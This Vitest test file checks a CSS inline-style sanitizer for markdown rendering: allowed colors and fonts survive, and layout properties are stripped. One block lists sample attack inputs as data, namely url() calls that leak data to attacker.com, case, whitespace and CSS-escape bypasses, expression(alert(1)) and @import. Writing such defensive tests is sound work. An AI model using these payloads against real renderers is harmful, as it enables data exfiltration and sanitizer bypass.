import { describe, expect, it } from 'vitest';

import { sanitizeInlineStyle } from '../markdown-helpers';

describe('sanitizeInlineStyle', () => {
  describe('allowed text styling survives', () => {
    it('keeps a named color', () => {
      expect(sanitizeInlineStyle('color: red')).toBe('color: red');
    });

    it('keeps colors whose names contain "url" (e.g. purple)', () => {
      expect(sanitizeInlineStyle('color: purple')).toBe('color: purple');
    });

    it('keeps hex and rgb() color values', () => {
      expect(sanitizeInlineStyle('color: #ff0000')).toBe('color: #ff0000');
      expect(sanitizeInlineStyle('background-color: rgb(255, 0, 0)')).toBe(
        'background-color: rgb(255, 0, 0)',
      );
    });

    it('keeps font and text declarations', () => {
      expect(sanitizeInlineStyle('font-weight: bold; font-style: italic')).toBe(
        'font-weight: bold; font-style: italic',
      );
      expect(sanitizeInlineStyle('text-decoration: underline')).toBe(
        'text-decoration: underline',
      );
      expect(sanitizeInlineStyle('font-size: 1.2em')).toBe('font-size: 1.2em');
    });

    it('drops disallowed declarations but keeps allowed ones', () => {
      expect(
        sanitizeInlineStyle('color: blue; position: fixed; font-weight: bold'),
      ).toBe('color: blue; font-weight: bold');
    });
  });

  describe('UI-redressing / layout properties are stripped', () => {
    it.each([
      'position: fixed; top: 0; left: 0',
      'POSITION: FIXED; TOP: 0', // case bypass
      'PoSiTiOn: fixed', // mixed case bypass
      'z-index: 9999',
      'Z-INDEX: 9999',
      'transform: translateY(-200px) scale(10)',
      'margin-top: -500px; margin-left: 300px',
      'opacity: 0',
      'pointer-events: none',
      'width: 100vw; height: 100vh',
      'display: none',
    ])('strips %s', (style) => {
      expect(sanitizeInlineStyle(style)).toBe('');
    });
  });

  describe('data-exfiltration / code-execution vectors are stripped', () => {
    it.each([
      'background-color: url(https://attacker.com/x.png?leak=secret)',
      'background-color: URL(https://attacker.com/x.png)',
      'background-color: url (https://attacker.com/x.png)',
      'color: expression(alert(1))',
      'background-color: \\75rl(https://attacker.com/x.png)', // CSS escape for url(
    ])('strips %s', (style) => {
      expect(sanitizeInlineStyle(style)).toBe('');
    });

    it('drops a url() declaration while keeping the safe sibling declaration', () => {
      expect(
        sanitizeInlineStyle(
          'color: red; background-color: url(https://attacker.com/x.png)',
        ),
      ).toBe('color: red');
    });

    it('strips values containing backslash escapes', () => {
      expect(sanitizeInlineStyle('color: \\72ed')).toBe('');
    });

    it('strips values with comments or at-rules', () => {
      expect(sanitizeInlineStyle('color: red/**/; @import "x"')).toBe('');
    });
  });

  describe('malformed input', () => {
    it('returns empty string for empty input', () => {
      expect(sanitizeInlineStyle('')).toBe('');
    });

    it('ignores declarations without a colon', () => {
      expect(sanitizeInlineStyle('color red')).toBe('');
    });

    it('ignores empty property or value', () => {
      expect(sanitizeInlineStyle(': red; color:')).toBe('');
    });
  });
});
